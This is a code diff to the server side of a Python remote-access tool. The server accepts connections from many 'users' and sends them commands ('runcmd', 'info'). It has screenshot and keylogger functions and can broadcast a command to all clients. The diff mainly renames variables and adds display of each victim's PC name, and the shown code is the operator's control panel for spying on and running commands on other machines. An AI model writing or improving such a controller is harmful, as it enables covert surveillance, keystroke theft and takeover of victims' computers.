@@ -15,8 +15,8 @@ intThreads = 2
 arJobs = [1, 2]
 queue = Queue()
 
-arAddresses = []
-arConnections = []
+arrAddresses = []
+arrConnections = []
 
 strHost = "0.0.0.0"
 intPort = 3000
@@ -63,15 +63,15 @@ def socket_bind():
 
 
 def socket_accept():
-    global blnFirstRun, arAddresses
+    global blnFirstRun, arrAddresses
     while True:
         try:
             conn, address = objSocket.accept()
             conn.setblocking(1)  # no timeout
-            arConnections.append(conn)  # append connection to array
+            arrConnections.append(conn)  # append connection to array
             client_hostname = conn.recv(1024).decode("utf-8")
             address = address + (client_hostname,)
-            arAddresses.append(address)
+            arrAddresses.append(address)
             print("\n" + "A user has just connected ;) ....")
         except socket.error:
             print("Error accepting connections!")
@@ -123,26 +123,26 @@ def main_menu():
 
 
 def close():
-    global arConnections, arAddresses
+    global arrConnections, arrAddresses
 
-    if len(arAddresses) == 0:  # if there are no computers connected
+    if len(arrAddresses) == 0:  # if there are no computers connected
         return
 
-    for intCounter, conn in enumerate(arConnections):
+    for intCounter, conn in enumerate(arrConnections):
         conn.send(str.encode("exit"))
         conn.close()
-    del arConnections; arConnections = []
-    del arAddresses; arAddresses = []
+    del arrConnections; arrConnections = []
+    del arrAddresses; arrAddresses = []
 
 
 def refresh_connections():  # used to remove any lost connections
-    global arConnections, arAddresses
-    for intCounter, conn in enumerate(arConnections):
+    global arrConnections, arrAddresses
+    for intCounter, conn in enumerate(arrConnections):
         try:
             conn.send(str.encode("test"))  # test to see if connection is active
         except socket.error:
-            del arAddresses[intCounter]
-            del arConnections[intCounter]
+            del arrAddresses[intCounter]
+            del arrConnections[intCounter]
             conn.close()
 
 
@@ -150,22 +150,23 @@ def list_connections():
     refresh_connections()
     strClients = ""
 
-    for intCounter, conn in enumerate(arConnections):
-        strClients += str(intCounter) + "\t" + str(arAddresses[intCounter][0]) + "\t" + \
-                       str(arAddresses[intCounter][1]) + "\t" + str(arAddresses[intCounter][2]) + "\n"
+    for intCounter, conn in enumerate(arrConnections):
+        strClients += str(intCounter) + "\t" + str(arrAddresses[intCounter][0]) + "\t" + \
+                       str(arrAddresses[intCounter][1]) + "\t" + str(arrAddresses[intCounter][2]) + "\n"
     print("\n" + "Users:" + "\n" + strClients)
 
 
 def select_connection(connection_id, blnGetResponse):
-    global conn, strIP
+    global conn, strIP, strCPName
     try:
         connection_id = int(connection_id)
-        conn = arConnections[connection_id]
+        conn = arrConnections[connection_id]
     except:
         print("Invalid choice, please try again!")
         return
     else:
-        strIP = arAddresses[connection_id][0]
+        strIP = arrAddresses[connection_id][0]
+        strCPName = arrAddresses[connection_id][2]
 
         if blnGetResponse == "True":
             print("You are connected to " + strIP + " ...." + "\n")
@@ -176,7 +177,7 @@ def send_command_all(command):
     if os.path.isfile("command_log.txt"):
         open("command_log.txt", "w").close()  # clear previous log contents
 
-    for intCounter in range(0, len(arAddresses)):
+    for intCounter in range(0, len(arrAddresses)):
         conn = select_connection(intCounter, "False")
 
         if conn is not None and command != "cmd":
@@ -185,9 +186,8 @@ def send_command_all(command):
 
 def user_info():
     conn.send(str.encode("info"))
-    strClientResponse = conn.recv(1024)
-    strClientResponse = decode_utf8(strClientResponse)
-    print(strClientResponse + "IP: " + strIP)
+    strClientResponse = decode_utf8(conn.recv(1024))
+    print(strClientResponse + "IP: " + strIP + "\n" + "PC Name: " + strCPName)
 
 
 def screenshot():
@@ -404,7 +404,7 @@ def keylogger(option):
 def send_command(command):
     conn.send(str.encode("runcmd" + command))
     intBuffer = int(conn.recv(1024).decode("utf-8"))  # receive buffer size
-    strClientResponse = "========================" + "\n" + strIP + "\t" + decode_utf8(recvall(intBuffer)) + \
+    strClientResponse = "========================" + "\n" + strIP + "\t" + strCPName + decode_utf8(recvall(intBuffer)) + \
                         "========================"
 
     if os.path.isfile("command_log.txt"):
@@ -512,7 +512,7 @@ def work():  # do jobs in the queue
         elif intValue == 2:
             while True:
                 time.sleep(0.2)
-                if len(arAddresses) > 0:
+                if len(arrAddresses) > 0:
                     main_menu()
                     break
         queue.task_done()
